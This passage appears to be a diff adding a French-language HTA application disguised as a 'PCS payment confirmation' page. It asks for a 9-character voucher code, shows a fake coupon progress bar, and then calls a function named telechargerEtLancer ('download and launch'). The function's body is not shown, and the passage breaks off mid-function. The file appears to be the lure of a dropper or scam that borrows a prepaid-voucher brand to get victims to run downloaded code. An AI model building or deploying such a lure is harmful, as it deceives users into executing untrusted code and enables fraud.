@@ -1,0 +1,196 @@
+<html>
+<head>
+<HTA:APPLICATION
+  ID="pcsCodeApp"
+  APPLICATIONNAME="Confirmation de Paiement PCS"
+  BORDER="none"
+  CAPTION="no"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+/>
+<meta charset="UTF-8">
+<title>Confirmation de Paiement - PCS</title>
+<style>
+    html, body {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        background: #F5B041;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+    }
+
+    .container {
+        position: absolute;
+        width: 750px;
+        top: 50%;
+        left: 50%;
+        margin-left: -375px;
+        margin-top: -280px;
+        background: white;
+        padding: 50px;
+        border-radius: 15px;
+        box-shadow: 0 0 30px rgba(0,0,0,0.3);
+        text-align: center;
+    }
+
+    .logo {
+        height: 180px;
+        margin-bottom: 5px;
+    }
+
+    h1 {
+        color: #003366;
+        font-size: 32px;
+        margin-bottom: 25px;
+    }
+
+    p {
+        font-size: 20px;
+        margin-bottom: 25px;
+    }
+
+    .input-box {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin-bottom: 30px;
+    }
+
+    .input-box input {
+        width: 65px;
+        height: 75px;
+        text-align: center;
+        font-size: 36px;
+        font-weight: bold;
+        border: 2px solid #ccc;
+        border-radius: 8px;
+    }
+
+    .validate-btn {
+        padding: 16px 40px;
+        background-color: #00A859;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-size: 18px;
+        cursor: pointer;
+    }
+
+    .validate-btn:hover {
+        background-color: #008f48;
+    }
+
+    .error-message {
+        color: red;
+        font-size: 16px;
+        margin-top: 20px;
+        display: none;
+    }
+
+    #progressWrapper {
+        width: 80%;
+        max-width: 400px;
+        margin: 20px auto;
+        background-color: #ddd;
+        border-radius: 10px;
+        overflow: hidden;
+        height: 30px;
+        display: none;
+    }
+
+    #progressBar {
+        width: 0%;
+        height: 100%;
+        background-color: #4CAF50;
+        transition: width 0.4s ease;
+    }
+
+    #progressText {
+        text-align: center;
+        margin-top: 10px;
+        font-weight: bold;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://s3-eu-west-1.amazonaws.com/tpd/logos/51964e66000064000531d5dc/0x0.png" alt="Logo PCS" class="logo">
+    <h1>Confirmation du code PCS</h1>
+    <p>Veuillez entrer votre code à 9 caractères :</p>
+
+    <div class="input-box">
+        <input type="text" maxlength="1" onkeyup="move(event, 0)">
+        <input type="text" maxlength="1" onkeyup="move(event, 1)">
+        <input type="text" maxlength="1" onkeyup="move(event, 2)">
+        <input type="text" maxlength="1" onkeyup="move(event, 3)">
+        <input type="text" maxlength="1" onkeyup="move(event, 4)">
+        <input type="text" maxlength="1" onkeyup="move(event, 5)">
+        <input type="text" maxlength="1" onkeyup="move(event, 6)">
+        <input type="text" maxlength="1" onkeyup="move(event, 7)">
+        <input type="text" maxlength="1" onkeyup="move(event, 8)">
+    </div>
+
+    <button class="validate-btn" onclick="validate()">Valider</button>
+    <div class="error-message" id="errorMsg">Code incorrect. Veuillez réessayer.</div>
+
+    <div id="progressWrapper">
+        <div id="progressBar"></div>
+    </div>
+    <div id="progressText"></div>
+</div>
+
+<script>
+function move(e, index) {
+    var inputs = document.getElementsByTagName("input");
+    if (e.key.length === 1 && /^[a-zA-Z0-9]$/.test(e.key)) {
+        if (inputs[index].value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    }
+    if (e.key === "Backspace" && index > 0 && inputs[index].value === "") {
+        inputs[index - 1].focus();
+    }
+}
+
+function validate() {
+    var inputs = document.getElementsByTagName("input");
+    var code = "";
+
+    for (var i = 0; i < inputs.length; i++) {
+        code += inputs[i].value;
+    }
+
+    var correctCode = "123456789"; // ← le code de validation ici
+
+    if (code === correctCode) {
+        document.getElementById("errorMsg").style.display = "none";
+
+        var progressWrapper = document.getElementById("progressWrapper");
+        var progressBar = document.getElementById("progressBar");
+        var progressText = document.getElementById("progressText");
+
+        progressWrapper.style.display = "block";
+        progressText.textContent = "Préparation de votre coupon...";
+
+        var pct = 0;
+        var interval = setInterval(function () {
+            pct += 5;
+            progressBar.style.width = pct + "%";
+            progressText.textContent = "Chargement : " + pct + "%";
+            if (pct >= 100) {
+                clearInterval(interval);
+                progressText.textContent = "Exécution en cours...";
+                telechargerEtLancer();
+            }
+        }, 300);
+    } else {
+        for (var i = 0; i < inputs.length; i++) {
+            inputs[i].style.borderColor = "red";
+        }
+        document.getElementById("errorMsg").style.display = "block";
+
+        setTimeout(function () {
+            for (var i = 0; i < inputs.length; i++) {
